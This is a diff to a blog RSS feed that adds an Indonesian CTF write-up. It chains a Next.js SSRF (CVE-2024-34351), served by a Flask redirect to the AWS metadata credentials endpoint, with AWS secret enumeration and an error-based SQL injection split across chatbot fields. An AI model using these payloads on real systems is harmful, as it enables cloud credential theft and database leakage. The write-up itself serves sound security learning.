@@ -1,4 +1,270 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lordrukie</title><link>https://blog.lordrukie.com/post/</link><description>Recent content in Posts on lordrukie</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 24 Feb 2025 13:44:48 +0000</lastBuildDate><atom:link href="https://blog.lordrukie.com/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Patchstack S02E01 - WordCamp Asia CTF Writeup</title><link>https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/</link><pubDate>Mon, 24 Feb 2025 11:56:49 +0700</pubDate><guid>https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/</guid><description>&lt;img src="https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg" alt="Featured image of post Patchstack S02E01 - WordCamp Asia CTF Writeup" />&lt;h2 id="intro">Intro
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lordrukie</title><link>https://blog.lordrukie.com/post/</link><description>Recent content in Posts on lordrukie</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 15 Aug 2025 22:54:19 +0700</lastBuildDate><atom:link href="https://blog.lordrukie.com/post/index.xml" rel="self" type="application/rss+xml"/><item><title>ITSEC CTF 2025</title><link>https://blog.lordrukie.com/p/itsec-ctf-2025/</link><pubDate>Fri, 15 Aug 2025 22:54:19 +0700</pubDate><guid>https://blog.lordrukie.com/p/itsec-ctf-2025/</guid><description>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/banner.png" alt="Featured image of post ITSEC CTF 2025" />&lt;h2 id="cloud---rabbit-hole">Cloud - Rabbit Hole
+&lt;/h2>&lt;blockquote>
+&lt;p>My friend is obsessed with JoJo&amp;rsquo;s Bizarre Adventure, so he built a themed website and asked me to deploy it. Problem is&amp;hellip; I kinda used my dad&amp;rsquo;s AWS account without telling him 😅.
+Can you take a look around the website and see if there&amp;rsquo;s anything sensitive exposed?&lt;br>
+Flag Format: ITSEC{.*}&lt;br>
+Author: kangwijen &amp;amp; Djumanto&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="desciption">Desciption
+&lt;/h3>&lt;p>Challenge cloud ini memiliki tiga kategori, yakni cloud, web, dan ai. Pada soal ini, peserta akan melakukan chaining attack terhadap ketiga topik tersebut.&lt;/p>
+&lt;h3 id="enumeration--exploitation---web">Enumeration &amp;amp; Exploitation - Web
+&lt;/h3>&lt;p>Diberikan website berikut
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image.png"
+width="1496"
+height="697"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="214"
+data-flex-basis="515px"
+>&lt;/p>
+&lt;p>Jika dilihat menggunakan wappalyzer, diketahui bahwa web menggunakan nextjs versi 14.1.0
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-1.png"
+width="864"
+height="948"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="91"
+data-flex-basis="218px"
+>&lt;/p>
+&lt;p>Versi ini vulnerable terhadap SSRF CVE-2024-34351&lt;/p>
+&lt;blockquote>
+&lt;p>Ref: &lt;a class="link" href="https://github.com/God4n/nextjs-CVE-2024-34351-_exploit" target="_blank" rel="noopener"
+>https://github.com/God4n/nextjs-CVE-2024-34351-_exploit&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>Untuk cara exploitnya, pertama perlu setup vps dan jalankan code berikut&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">redirect&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">defaults&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;path&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;lt;path:path&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">method&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;HEAD&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;text/x-component&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">resp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://169.254.169.254/latest/meta-data/iam/security-credentials&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;3000&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Kemudian kirim request seperti ini. Nantinya target akan melakukan GET requests ke url yang kita input pada server.&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-2.png"
+width="1044"
+height="409"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="255"
+data-flex-basis="612px"
+>&lt;/p>
+&lt;h3 id="enumeration--exploitation---cloud">Enumeration &amp;amp; Exploitation - Cloud
+&lt;/h3>&lt;p>Pada hasil exploitasi diatas, terlihat bahwa terdapat security credentials rabbit-hole-role-XXX&lt;/p>
+&lt;p>Jika kita akses menggunakan SSRF sebelumnya, maka AccessKeyId, SecretAccessKey, dan token bisa kita peroleh.&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-3.png"
+width="1043"
+height="562"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="445px"
+>&lt;/p>
+&lt;p>Kemudian kita lakukan enumerasi lagi menggunakan &lt;a class="link" href="https://github.com/shabarkin/aws-enumerator" target="_blank" rel="noopener"
+>aws-enumerator&lt;/a>. Disini langsung diketahui bahwa user saat ini memiliki akses ke &lt;strong>amplify&lt;/strong> dan juga &lt;strong>secretsmanager&lt;/strong>&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-4.png"
+width="1040"
+height="262"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="396"
+data-flex-basis="952px"
+>
+&lt;br>
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-5.png"
+width="799"
+height="450"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="426px"
+>&lt;/p>
+&lt;p>Ketika di enumerasi lagi, ternyata terdapat satu application yang di deploy menggunakan amplify&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-6.png"
+width="1048"
+height="741"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="339px"
+>&lt;/p>
+&lt;p>Kemudian kami melanjutkan untuk melihat details dari application tersebut. Disini kami menemukan domain yang digunakan.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-7.png"
+width="1041"
+height="558"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="186"
+data-flex-basis="447px"
+>&lt;/p>
+&lt;p>Namun ketika diakses, tidak ada page yang bisa diakses sehingga menjadi 404
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-8.png"
+width="1006"
+height="547"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="183"
+data-flex-basis="441px"
+>&lt;/p>
+&lt;p>Disini kami lumayan lama dan cukup bingung, sampai rekan team sasya menemukan subdomain &lt;strong>production&lt;/strong>, sesuai dengan branchName yang digunakan.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-9.png"
+width="604"
+height="194"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="311"
+data-flex-basis="747px"
+>&lt;/p>
+&lt;p>Ketika diakses, kita akan diminta credentials sebelum bisa mengakses aplikasi.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-10.png"
+width="671"
+height="480"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="139"
+data-flex-basis="335px"
+>&lt;/p>
+&lt;p>Berhubung enumerasi AWS tadi ada &lt;strong>secretsmanager&lt;/strong>, jadi kami melakukan enumerasi terhadap service tersebut. Disini terdapat satu secrets yang kemungkinan besar digunakan untuk application amplify ini.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-11.png"
+width="1049"
+height="281"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="373"
+data-flex-basis="895px"
+>&lt;/p>
+&lt;p>Ketika diakses, kami mendapatkan credentials &lt;strong>prodtest:st4rl1ght123&lt;/strong>&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-12.png"
+width="1049"
+height="187"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="560"
+data-flex-basis="1346px"
+>&lt;/p>
+&lt;p>Dengan credentials tersebut, kami pun berhasil masuk kedalam aplikasi utama.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-13.png"
+width="1195"
+height="682"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="175"
+data-flex-basis="420px"
+>&lt;/p>
+&lt;h3 id="enumeration--exploitation---ai-x-web">Enumeration &amp;amp; Exploitation - AI x Web
+&lt;/h3>&lt;p>Di sini terdapat chatbot yang berguna untuk membuat booking terhadap specialist yang ada.
+&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-14.png"
+width="487"
+height="726"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="67"
+data-flex-basis="160px"
+>&lt;/p>
+&lt;p>Setelah enumerasi cukup lama, kami akhirnya menemukan SQL Injection pada chatbot ini&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-15.png"
+width="520"
+height="495"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="105"
+data-flex-basis="252px"
+>&lt;/p>
+&lt;p>Kami menemukan bahwa terdapat dua input yang vulnerable, yakni pada pertanyaan &lt;strong>“Who is the meeting with?&lt;/strong>” dan juga &lt;strong>“What is the meeting topic?”&lt;/strong>.&lt;/p>
+&lt;p>Akan tetapi, kami menyadari juga bahwa input yang masuk kedalam &lt;strong>“Meeting Topic”&lt;/strong> sepertinya terkena filter seperti &lt;strong>no space&lt;/strong>, &lt;strong>no sql comments&lt;/strong>, dan juga selalu error ketika terdapat &lt;strong>dua buah single quote.&lt;/strong>&lt;/p>
+&lt;p>Kami coba construct ulang kemungkinan query pada SQL, dan kira kira menjadi seperti ini&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">schedule&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">aaa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bbb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ccc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ddd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">eee&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;VULN Input 1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;2025-03-03&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ghi&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;VULN Input 2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;something&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Dan juga SQL Injection yang terjadi adalah Blind Based, karena ketika SQL Injection berhasil di sisi database, chatbot malah menampilkan input kita dan bukan data dari SQLServer.&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-16.png"
+width="554"
+height="326"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="407px"
+>&lt;/p>
+&lt;p>Disini kita mencoba approach lain, yakni Error Based SQL Injection (berhubung error SQL ditampilkan ke user).&lt;/p>
+&lt;p>Kemudian untuk menghindari filter pada chatbot, kami menggunakan payload yang dipisah berikut:&lt;/p>
+&lt;ol>
+&lt;li>“Who is the meeting with?”
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">abc&amp;#39;, UPDATEXML(null,CONCAT(0x0a,(select substring(data_backup_number_404,20,50) from backup_env)),null), 123/*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>“What is the meeting topic?”
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> */ , &amp;#39;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>Sehingga paylod final yang di eksekusi pada SQL Server menjadi berikut&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">schedule&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">aaa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">topic&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">email&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;abc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;def&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ghi&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;TEST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;mail@mail.com&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;abc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UPDATEXML&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">CONCAT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x0a&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data_backup_number_404&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">backup_env&lt;/span>&lt;span class="p">)),&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">123&lt;/span>&lt;span class="cm">/*&amp;#39;, &amp;#39;2005-02-02&amp;#39;, &amp;#39;09:00&amp;#39;, &amp;#39;*/&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;something&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Dan ketika dijalankan, Flag pun didapatkan. Tapi karena suatu alasan. Flagnya tidak muncul secara penuh, jadi perlu adjustment pada index substring nya.&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-17.png"
+width="687"
+height="292"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="235"
+data-flex-basis="564px"
+>&lt;/p>
+&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-18.png"
+width="674"
+height="323"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="208"
+data-flex-basis="500px"
+>&lt;/p>
+&lt;p>&lt;strong>Flag: ITSEC{bd8f95175722b36d0068fa36600a552a}&lt;/strong>&lt;/p></description></item><item><title>Patchstack S02E01 - WordCamp Asia CTF Writeup</title><link>https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/</link><pubDate>Mon, 24 Feb 2025 11:56:49 +0700</pubDate><guid>https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/</guid><description>&lt;img src="https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg" alt="Featured image of post Patchstack S02E01 - WordCamp Asia CTF Writeup" />&lt;h2 id="intro">Intro
 &lt;/h2>&lt;p>So i participated in Patchstack&amp;rsquo;s third hosted CTF event, this time it&amp;rsquo;s WordCamp Asia CTF. I managed to solve 7/10 challenges along the way and secured 3rd place in the leaderboard. The difficulty definitely harder than last patchstack CTF (in my opinion), but still fun. I learn a lot of cool tricks, specially in PHP and WordPress environment. Kudos to all problem setters, you guys did a great job 🔥🔥
 &lt;img src="https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image.png"
 width="1222"
